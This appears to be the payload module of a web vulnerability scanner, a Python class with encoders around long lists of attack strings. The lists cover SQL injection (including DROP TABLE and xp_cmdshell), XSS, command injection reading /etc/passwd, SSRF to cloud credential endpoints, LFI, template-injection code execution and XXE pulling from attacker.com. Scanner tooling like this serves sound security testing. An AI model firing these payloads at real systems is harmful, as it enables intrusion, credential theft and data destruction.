# scanner/dast/payloads.py
#
# ENHANCED VULNERABILITY PAYLOAD LIBRARY
# Comprehensive coverage with advanced organization, context-awareness, and performance optimizations

import base64
import urllib.parse
from typing import Dict, List, Optional, Set, Any, Generator, Union
from enum import Enum
import re

class PayloadCategory(Enum):
    SQLI = "sqli"
    XSS = "xss"
    CMDI = "cmdi"
    SSRF = "ssrf"
    LFI = "lfi"
    SSTI = "ssti"
    OPEN_REDIRECT = "open_redirect"
    XXE = "xxe"
    HEADER_INJECTION = "header_injection"
    JWT = "jwt"
    NOSQL = "nosql"
    GRAPHQL = "graphql"
    API_FUZZ = "api_fuzz"
    JUICESHOP = "juiceshop"

class PayloadContext(Enum):
    GENERAL = "general"
    URL_PARAM = "url_param"
    BODY_PARAM = "body_param"
    HEADER = "header"
    PATH = "path"
    COOKIE = "cookie"
    JSON = "json"
    XML = "xml"
    FORM = "form"

class PayloadEncoder(Enum):
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    BASE64 = "base64"
    HTML_ENTITY = "html_entity"
    UNICODE = "unicode"
    HEX = "hex"
    UTF16 = "utf16"
    UTF32 = "utf32"

class PayloadLibrary:
    def __init__(self, config: Optional[Dict] = None):
        self.config = {
            "max_payloads_per_category": 100,
            "enable_dangerous_payloads": True,
            "default_encoder": PayloadEncoder.NONE,
            "payload_limits": {
                PayloadCategory.SQLI: 50,
                PayloadCategory.XSS: 40,
                PayloadCategory.CMDI: 30,
                PayloadCategory.SSRF: 25,
                PayloadCategory.LFI: 35,
                PayloadCategory.SSTI: 20,
                PayloadCategory.OPEN_REDIRECT: 15,
                PayloadCategory.XXE: 10,
                PayloadCategory.HEADER_INJECTION: 15,
                PayloadCategory.JWT: 8,
                PayloadCategory.NOSQL: 12,
                PayloadCategory.GRAPHQL: 10,
                PayloadCategory.API_FUZZ: 20,
                PayloadCategory.JUICESHOP: 25,
            },
            "context_aware": True,
            "auto_encode": True,
        }
        
        if config:
            self.config.update(config)
        
        # Initialize payload storage
        self._payloads: Dict[PayloadCategory, List[str]] = {}
        self._encoded_payloads: Dict[PayloadCategory, Dict[PayloadEncoder, List[str]]] = {}
        
    def get_payloads(self, category: PayloadCategory, 
                    context: Optional[PayloadContext] = None,
                    encoder: Optional[PayloadEncoder] = None) -> List[str]:
        """
        Get payloads for a specific category with optional context and encoding.
        
        Args:
            category: The payload category
            context: Optional context for context-aware filtering
            encoder: Optional encoder for payload encoding
            
        Returns:
            List of payloads
        """
        if encoder is None:
            encoder = self.config["default_encoder"]
            
        # Lazy load payloads
        if category not in self._payloads:
            self._load_category_payloads(category)
            
        payloads = self._payloads[category]
        
        # Apply context filtering
        if context and self.config["context_aware"]:
            payloads = self._filter_by_context(payloads, context)
            
        # Apply encoding
        if encoder != PayloadEncoder.NONE and self.config["auto_encode"]:
            if category not in self._encoded_payloads:
                self._encoded_payloads[category] = {}
            if encoder not in self._encoded_payloads[category]:
                self._encoded_payloads[category][encoder] = [
                    self._encode_payload(p, encoder) for p in payloads
                ]
            payloads = self._encoded_payloads[category][encoder]
            
        # Apply limits
        limit = self.config["payload_limits"].get(category, self.config["max_payloads_per_category"])
        return payloads[:limit]
    
    def get_payloads_generator(self, category: PayloadCategory,
                             context: Optional[PayloadContext] = None,
                             encoder: Optional[PayloadEncoder] = None) -> Generator[str, None, None]:
        """
        Get payloads as a generator for memory efficiency.
        
        Args:
            category: The payload category
            context: Optional context for context-aware filtering
            encoder: Optional encoder for payload encoding
            
        Yields:
            Payload strings
        """
        payloads = self.get_payloads(category, context, encoder)
        for payload in payloads:
            yield payload
            
    def get_all_payloads(self, categories: Optional[List[PayloadCategory]] = None,
                        context: Optional[PayloadContext] = None,
                        encoder: Optional[PayloadEncoder] = None) -> Dict[PayloadCategory, List[str]]:
        """
        Get payloads for multiple categories.
        
        Args:
            categories: List of categories (None for all)
            context: Optional context for context-aware filtering
            encoder: Optional encoder for payload encoding
            
        Returns:
            Dictionary of category to payloads
        """
        if categories is None:
            categories = list(PayloadCategory)
            
        result = {}
        for category in categories:
            result[category] = self.get_payloads(category, context, encoder)
            
        return result
    
    def _load_category_payloads(self, category: PayloadCategory) -> None:
        """Load payloads for a specific category."""
        if category == PayloadCategory.SQLI:
            self._payloads[category] = SQLI_PAYLOADS
        elif category == PayloadCategory.XSS:
            self._payloads[category] = XSS_PAYLOADS
        elif category == PayloadCategory.CMDI:
            self._payloads[category] = CMDI_PAYLOADS
        elif category == PayloadCategory.SSRF:
            self._payloads[category] = SSRF_PAYLOADS
        elif category == PayloadCategory.LFI:
            self._payloads[category] = LFI_PAYLOADS
        elif category == PayloadCategory.SSTI:
            self._payloads[category] = SSTI_PAYLOADS
        elif category == PayloadCategory.OPEN_REDIRECT:
            self._payloads[category] = OPEN_REDIRECT_PAYLOADS
        elif category == PayloadCategory.XXE:
            self._payloads[category] = XXE_PAYLOADS
        elif category == PayloadCategory.HEADER_INJECTION:
            self._payloads[category] = HEADER_INJECTION_PAYLOADS
        elif category == PayloadCategory.JWT:
            self._payloads[category] = JWT_PAYLOADS
        elif category == PayloadCategory.NOSQL:
            self._payloads[category] = NOSQL_PAYLOADS
        elif category == PayloadCategory.GRAPHQL:
            self._payloads[category] = GRAPHQL_PAYLOADS
        elif category == PayloadCategory.API_FUZZ:
            self._payloads[category] = API_FUZZ_PAYLOADS
        elif category == PayloadCategory.JUICESHOP:
            # Flatten JuiceShop payloads
            all_js_payloads = []
            for subcategory in JUICESHOP_PAYLOADS.values():
                all_js_payloads.extend(subcategory)
            self._payloads[category] = all_js_payloads
    
    def _filter_by_context(self, payloads: List[str], context: PayloadContext) -> List[str]:
        """Filter payloads based on context."""
        if context == PayloadContext.URL_PARAM:
            return [p for p in payloads if self._is_suitable_for_url_param(p)]
        elif context == PayloadContext.BODY_PARAM:
            return [p for p in payloads if self._is_suitable_for_body_param(p)]
        elif context == PayloadContext.HEADER:
            return [p for p in payloads if self._is_suitable_for_header(p)]
        elif context == PayloadContext.PATH:
            return [p for p in payloads if self._is_suitable_for_path(p)]
        elif context == PayloadContext.COOKIE:
            return [p for p in payloads if self._is_suitable_for_cookie(p)]
        elif context == PayloadContext.JSON:
            return [p for p in payloads if self._is_suitable_for_json(p)]
        elif context == PayloadContext.XML:
            return [p for p in payloads if self._is_suitable_for_xml(p)]
        elif context == PayloadContext.FORM:
            return [p for p in payloads if self._is_suitable_for_form(p)]
        else:
            return payloads
    
    def _is_suitable_for_url_param(self, payload: str) -> bool:
        """Check if payload is suitable for URL parameters."""
        # Avoid very long payloads for URLs
        return len(payload) <= 200 and not payload.startswith(('http://', 'https://'))
    
    def _is_suitable_for_body_param(self, payload: str) -> bool:
        """Check if payload is suitable for body parameters."""
        # Body can handle larger payloads
        return len(payload) <= 1000
    
    def _is_suitable_for_header(self, payload: str) -> bool:
        """Check if payload is suitable for headers."""
        # Headers have specific format requirements
        return len(payload) <= 100 and '\n' not in payload and '\r' not in payload
    
    def _is_suitable_for_path(self, payload: str) -> bool:
        """Check if payload is suitable for path segments."""
        # Path segments should not contain slashes (unless encoded)
        return '/' not in payload or '%2F' in payload
    
    def _is_suitable_for_cookie(self, payload: str) -> bool:
        """Check if payload is suitable for cookies."""
        # Cookies have specific character restrictions
        return all(ord(c) < 128 for c in payload) and ';' not in payload
    
    def _is_suitable_for_json(self, payload: str) -> bool:
        """Check if payload is suitable for JSON."""
        # JSON should be properly formatted
        try:
            import json
            json.loads(payload)
            return True
        except (json.JSONDecodeError, ValueError):
            return False
    
    def _is_suitable_for_xml(self, payload: str) -> bool:
        """Check if payload is suitable for XML."""
        # Basic XML structure check
        return payload.strip().startswith('<?xml') or '<' in payload
    
    def _is_suitable_for_form(self, payload: str) -> bool:
        """Check if payload is suitable for form data."""
        # Form data is generally flexible
        return True
    
    def _encode_payload(self, payload: str, encoder: PayloadEncoder) -> str:
        """Encode a payload using the specified encoder."""
        try:
            if encoder == PayloadEncoder.URL:
                return urllib.parse.quote(payload)
            elif encoder == PayloadEncoder.DOUBLE_URL:
                return urllib.parse.quote(urllib.parse.quote(payload))
            elif encoder == PayloadEncoder.BASE64:
                return base64.b64encode(payload.encode()).decode()
            elif encoder == PayloadEncoder.HTML_ENTITY:
                import html
                return html.escape(payload)
            elif encoder == PayloadEncoder.UNICODE:
                # Unicode escape
                return ''.join(f'\\u{ord(c):04x}' for c in payload)
            elif encoder == PayloadEncoder.HEX:
                return payload.encode().hex()
            elif encoder == PayloadEncoder.UTF16:
                return payload.encode('utf-16-le').hex()
            elif encoder == PayloadEncoder.UTF32:
                return payload.encode('utf-32-le').hex()
            else:
                return payload
        except Exception:
            return payload
    
    def get_random_payload(self, category: PayloadCategory,
                          context: Optional[PayloadContext] = None,
                          encoder: Optional[PayloadEncoder] = None) -> str:
        """
        Get a random payload from the specified category.
        
        Args:
            category: The payload category
            context: Optional context for context-aware filtering
            encoder: Optional encoder for payload encoding
            
        Returns:
            A random payload
        """
        payloads = self.get_payloads(category, context, encoder)
        if payloads:
            import random
            return random.choice(payloads)
        return ""
    
    def search_payloads(self, query: str, 
                       categories: Optional[List[PayloadCategory]] = None) -> Dict[PayloadCategory, List[str]]:
        """
        Search payloads across categories.
        
        Args:
            query: Search query
            categories: Categories to search (None for all)
            
        Returns:
            Dictionary of matching payloads by category
        """
        if categories is None:
            categories = list(PayloadCategory)
            
        results = {}
        for category in categories:
            payloads = self.get_payloads(category)
            matches = [p for p in payloads if query.lower() in p.lower()]
            if matches:
                results[category] = matches
                
        return results

# --- SQL INJECTION (SQLi) ---
SQLI_PAYLOADS = [
    # Classic break-strings
    "'", '"', "\\", "1'", "1\"", "1))", "1'))",
    # Boolean-based auth bypass
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "\" OR \"1\"=\"1", "' OR '1'='1'--", "' OR '1'='1'#",
    "1' AND '1'='1", "1 AND 1=1", "1 AND 1=2",
    "admin'--", "admin'#", "admin'/*",
    # UNION-based column discovery
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    # Error-based MySQL
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND exp(~(SELECT * FROM (SELECT version())a))--",
    # Error-based MSSQL
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "'; EXEC xp_cmdshell('whoami')--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    # Error-based PostgreSQL
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=CAST((SELECT current_user) AS int)--",
    # Time-based blind MySQL
    "' AND SLEEP(6)--", "1' AND SLEEP(6)--", "' OR SLEEP(6)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(6)))a)--",
    "' AND IF(1=1,SLEEP(6),0)--",
    # Time-based blind MSSQL
    "'; WAITFOR DELAY '0:0:6'--", "1; WAITFOR DELAY '0:0:6'--",
    # Time-based blind PostgreSQL
    "'; SELECT pg_sleep(6)--", "1; SELECT pg_sleep(6)--",
    "' AND (SELECT pg_sleep(6))--",
    # Time-based blind Oracle
    "' OR 1=1 AND ROWNUM=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',6)=1)--",
    # Stacked queries
    "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--",
    "'; DROP TABLE users--",
    # Second-order injection
    "admin'--", "admin'#",
    # WAF bypass encodings
    "'/**/OR/**/1=1--", "' /*!OR*/ 1=1--", "'+OR+1=1--",
    "%27+OR+1%3D1--", "' OR 0x313d31--",
    "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
    "' UniOn SeLeCt 1,2,3--",
    # NoSQL injection
    '{"$gt": ""}', '{"$where": "1==1"}', "' || '1'=='1",
    '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
    # PHP type juggling with SQL
    "' OR 1='1", "' OR '1",
    # JuiceShop-specific: SQLite
    "' UNION SELECT 1,2,3,4,5,6,7,8--",
    "' UNION SELECT sql,2,3,4,5,6,7,8 FROM sqlite_master--",
    "' AND 1=1 UNION SELECT username,password,3,4,5,6,7,8 FROM users--",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "PostgreSQL query failed:",
    "ORA-00933: SQL command not properly ended",
    "sqlite3?",
    "syntax error at or near",
    "pg::syntaxerror",
    "check the manual that corresponds to your",
    "supplied argument is not a valid mysql",
    "division by zero in sql",
    "invalid column name",
    "column '.*' does not exist",
    "table '.*' doesn't exist",
    "unknown column '.*' in",
    "data truncated for column",
    "operand should contain 1 column",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "sqlstate=",
    "ora-\\d{5}",
    "warning.*oci_",
    "pg_query()",
    "unterminated quoted string",
]

# --- CROSS-SITE SCRIPTING (XSS) ---
XSS_PAYLOADS = [
    # Classic
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<script\t>alert(1)</script>",
    "<script\n>alert(1)</script>",
    "<script/src=data:,alert(1)>",
    # IMG tags
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)//",
    "<img src=javascript:alert(1)>",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    "<IMG SRC=x ONERROR=alert(1)>",
    # SVG
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1)>",
    "<svg><use href=data:image/svg+xml,<svg onload=alert(1)> >",
    # Event handlers
    '" onmouseover=alert(1) x="',
    "' onfocus=alert(1) autofocus '",
    '" onclick=alert(1) "',
    '" onload=alert(1) "',
    "' onerror=alert(1) '",
    '" onfocus=alert(1) autofocus="',
    # Body/iframe
    "<body onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    # JS context
    "';alert(1);//",
    '";alert(1);//',
    "`;alert(1)//",
    "'-alert(1)-'",
    "\\';alert(1);//",
    "';alert(1)//",
    "';return/**/alert(1)//",
    # Filter bypass
    "<img/src=x onerror=alert(1)>",
    "<<script>alert(1)//<</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # HTML entity bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # URL encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # Double encoded
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Null byte injection
    "<scri\x00pt>alert(1)</scri\x00pt>",
    # Unicode bypass
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # JSON context
    '"};</script><script>alert(1)//</script>',
    # Template injection XSS
    "{{constructor.constructor('alert(1)')()}}",
    # DOM XSS sinks
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Mutation XSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
    # CSS injection
    "<style>@keyframes x{}</style><b style='animation-name:x' onanimationstart=alert(1)></b>",
    # Angular/Vue template injection as XSS
    "{{7*7}}",
    "${7*7}",
    # JuiceShop-specific: DOMPurify bypass
    "<img src=x onerror=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    # Markdown XSS
    "[click](javascript:alert(1))",
    "[click]: (javascript:alert(1))",
    # Input/event in various tags
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video onerror=alert(1)><source src=x>",
    "<audio onerror=alert(1)><source src=x>",
    # Encoded event handlers
    "<img src=x oNerRor=alert(1)>",
    "<img src=x onerror =alert(1)>",
    "<img src=x onerror\t=alert(1)>",
    "<img src=x onerror\n=alert(1)>",
]

# --- COMMAND INJECTION (CMDI) ---
CMDI_PAYLOADS = [
    # Linux/Unix Reflected
    "; id", "| id", "& id", "&& id", "|| id",
    "; whoami", "| whoami", "$(whoami)", "`whoami`",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "$(cat /etc/passwd)", "`cat /etc/passwd`",
    # Blind
    "; sleep 6; #", "| sleep 6", "$(sleep 6)", "`sleep 6`",
    "; ping -c 6 127.0.0.1", "| ping -c 6 127.0.0.1",
    # Windows
    "& whoami", "| whoami",
    "& timeout /t 6 &", "| timeout /t 6",
    "& ping -n 6 127.0.0.1",
    # Encoded
    "%3Bid", "%7Cid", "%26%26+id",
    # Newline injection
    "\nid\n", "\r\nid\r\n",
    # JuiceShop-specific
    "; echo SENTINEL_CMDI", "| echo SENTINEL_CMDI",
    "$(echo SENTINEL_CMDI)", "`echo SENTINEL_CMDI`",
]

# --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
SSRF_PAYLOADS = [
    # AWS/OpenStack Metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP Metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure Metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # IP bypasses
    "http://0251.0376.0251.0376/",                   # Octal
    "http://2852039166/",                            # Decimal
    "http://0x7f000001/",                            # Hex
    "http://0177.0.0.1/",                            # Octal
    "http://0/",                                      # Zero
    "http://127.1/",                                  # Shortened
    "http://127.0.1/",                                # Shortened variant
    # Internal services
    "http://localhost:80", "http://localhost:443",
    "http://127.0.0.1", "http://0.0.0.0",
    "http://[::1]", "http://[::ffff:127.0.0.1]",
    # Protocol schemes
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "ldap://127.0.0.1", "sftp://evil.com",
    # DNS rebinding
    "http://127.0.0.1.nip.io", "http://spoofed.127.0.0.1.xip.io",
    # Internal network scanning
    "http://192.168.0.1", "http://10.0.0.1", "http://172.16.0.1",
    "http://127.0.0.1:6379", "http://127.0.0.1:9200",
    "http://127.0.0.1:27017", "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
]

# --- LOCAL FILE INCLUSION (LFI) ---
LFI_PAYLOADS = [
    # Linux
    "../../../../etc/passwd", "../../../../etc/hosts",
    "../../../../etc/shadow", "../../../../etc/crontab",
    "../../../../proc/self/environ", "../../../../proc/self/cmdline",
    "../../../../proc/self/fd/0",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    # Windows
    "../../../../windows/win.ini",
    "../../../../windows/system32/config/sam",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    # Double-filter bypass
    "....//....//....//....//etc/passwd",
    "....\\....\\....\\....\\windows\\win.ini",
    # URL-encoded
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    # Double-encoded
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Null byte truncation
    "/etc/passwd%00", "/etc/passwd%00.jpg",
    "../../../../etc/passwd%00",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../../config.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "zip://uploads/evil.zip#shell.php",
    # Path normalization bypass
    "/..%c0%af..%c0%af..%c0%afetc/passwd",
    "/..%252f..%252f..%252fetc/passwd",
    # JuiceShop-specific paths
    "/etc/passwd", "/proc/version", "/etc/issue",
    "../../../../../../../etc/passwd",
]

# --- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
SSTI_PAYLOADS = [
    # Detection
    "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    "{{config}}", "{{self.__dict__}}", "{{settings}}",
    # Jinja2 RCE
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.__class__.__mro__[1].__subclasses__()}}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # FreeMarker
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    # Velocity
    '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()',
    # Smarty (PHP)
    "{php}echo `id`;{/php}", "{system('id')}",
    # Pug/Jade
    "#{7*7}", "#[7*7]",
    # Mako
    "${7*7}", "${__import__('os').popen('id').read()}",
    # ERB/Ruby
    "<%= 7*7 %>", "<%= `id` %>", "<%= system('id') %>",
    # Django
    "{% debug %}", "{% load module %}",
    # Handlebars
    "{{constructor.constructor('return this')()}}",
    # JuiceShop-specific: Angular template injection
    "{{this.constructor.constructor('return this')()}}",
    "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
]

# --- OPEN REDIRECT ---
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "/\\evil.com",
    "/%09/evil.com", "//evil%2ecom", "https:evil.com",
    "//%00evil.com", "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
    "/../../../evil.com", "/..%2f..%2f..%2fevil.com",
    "https://evil.com%00.legitimate.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/redirect?url=https://evil.com",
    "//evil.com/", "https://evil.com/",
    "http://evil.com", "http://127.0.0.1",
]

# --- XML EXTERNAL ENTITY (XXE) ---
XXE_PAYLOADS = [
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # Parameter entity OOB
    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo/>',
    # Billion laughs (DoS detection)
    r'<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;">]><lol>&b;</lol>',
    # UTF-7 variant
    r'+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe;+ADw-/foo+AD4-',
]

# --- HEADER INJECTION ---
HEADER_INJECTION_PAYLOADS = [
    "\r\nX-Injected: true",
    "%0d%0aX-Injected: true",
    "%0aX-Injected: true",
    "\nX-Injected: true",
    "\r\nSet-Cookie: admin=1",
    "%0d%0aLocation: https://evil.com",
    "\r\nSet-Cookie: session=stolen",
    "%0d%0aSet-Cookie: pwned=1",
]

# --- JWT ATTACK PAYLOADS ---
JWT_PAYLOADS = [
    # alg:none
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    # Weak key hints
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYwdtaW4ifQ.wrong",
    # JWK injection
    "eyJhbGciOiJYWUFSNiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
    # kid injection
    "eyJhbGciOiJIUzI1NiIsImtpZCI6IicgT1IgMT0xLS0iLCJ0eXAiOiJKV1QifQ.eyJyb2xlIjoiYWRtaW4ifQ.",
]

# --- NOSQL INJECTION ---
NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": ""}', '{"$gt":""}', '{"$ne":""}',
    '{"$where": "1==1"}', '{"$where": "this.password.match(/.*/)"  }',
    '{"$regex": ".*"}', '{"$exists": true}',
    "true, $where: '1==1'", "' || '1'=='1",
    '{"username": {"$gt":""}, "password": {"$gt":""}}',
    '{"username": {"$ne":"admin"}, "password": {"$ne":""}}',
    '{"$or": [{"username": "admin"}, {"username": {"$ne":""}}]}',
]

# --- GRAPHQL PAYLOADS ---
GRAPHQL_PAYLOADS = [
    '{"query":"{ __schema { types { name } } }"}',
    '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}',
    '{"query":"{ users { id username email password } }"}',
    '{"query":"mutation { createAdmin(username: \"hacked\", password: \"hacked\") { id } }"}',
    '{"query":"{ debug { sourceCode } }"}',
]

# --- API FUZZ PAYLOADS ---
API_FUZZ_PAYLOADS = [
    # IDOR via path
    "/api/users/1", "/api/users/2", "/api/users/admin",
    "/api/v1/users/1", "/api/v2/users/1",
    # Mass assignment
    '{"role":"admin"}', '{"is_admin":true}', '{"admin":1}',
    # HTTP method tampering
    "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE",
    # Content-type confusion
    "application/json", "application/xml", "text/xml",
    # API key brute
    "Bearer null", "Bearer undefined", "Bearer admin",
    "Basic YWRtaW46YWRtaW4=",  # admin:admin
]

# --- JUICESHOP-SPECIFIC PAYLOADS ---
JUICESHOP_PAYLOADS = {
    "admin_access": [
        "/administration", "/ftp", "/ftp/quarantine",
        "/api/admin", "/api/user-management", "/api/complaints",
        "/api/basket/1", "/api/address-selection",
        "/api/track-result?id=1", "/api/data erasure",
        "/api/security-question", "/api/security-answer",
        "/api/user/1", "/api/users/1",
    ],
    "sqli_search": [
        "' UNION SELECT 1,2,3,4,5,6,7,8--",
        "' UNION SELECT id,username,password,4,5,6,7,8 FROM users--",
        "'; DROP TABLE users;--",
        "' OR 1=1--",
        "q' OR 1=1--",
    ],
    "xss_search": [
        "<script>alert('XSS')</script>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<img src=x onerror=alert('XSS')>",
        "<div onmouseover=alert('XSS')>hover me</div>",
    ],
    "restful_api": [
        "/api/products/1", "/api/products/search",
        "/api/basket/1", "/api/user/1",
        "/api/challenges", "/api/complaints",
        "/api/data erasure", "/api/track-result",
        "/api/security-question", "/api/user/1",
    ],
    "sensitive_paths": [
        "/ftp", "/ftp/quarantine", "/ftp/coupons_2013.md.bak",
        "/.git", "/.env", "/robots.txt", "/sitemap.xml",
        "/encryptionkeys", "/encryptionkeys/default",
        "/api/error-reporting", "/api/file-server",
        "/redirect", "/redirect?to=https://evil.com",
        "/profile", "/profile/change-password",
        "/score-board", "/administration",
        "/2fa/validate", "/2fa/setup",
        "/b2b/v2/orders", "/b2b/v2/supply",
        "/api/product-reviews", "/api/product-reviews/1",
        "/api/basket/1/coupon",
        "/api/user/1", "/api/users",
        "/api/data erasure",
        "/api/track-result",
        "/api/address-selection",
        "/api/payment",
        "/api/recycle",
        "/api/security-question",
        "/api/user/1",
        "/api/user/change-password",
        "/api/user/whoami",
        "/api/user/reset-password",
    ],
}

# Global instance for backward compatibility
payload_library = PayloadLibrary()

# Backward compatibility functions
def get_payloads(category: str) -> List[str]:
    """Legacy function for backward compatibility."""
    try:
        payload_category = PayloadCategory(category.lower())
        return payload_library.get_payloads(payload_category)
    except ValueError:
        return []

def get_all_payloads() -> Dict[str, List[str]]:
    """Legacy function for backward compatibility."""
    result = {}
    for category in PayloadCategory:
        result[category.value] = payload_library.get_payloads(category)
    return result
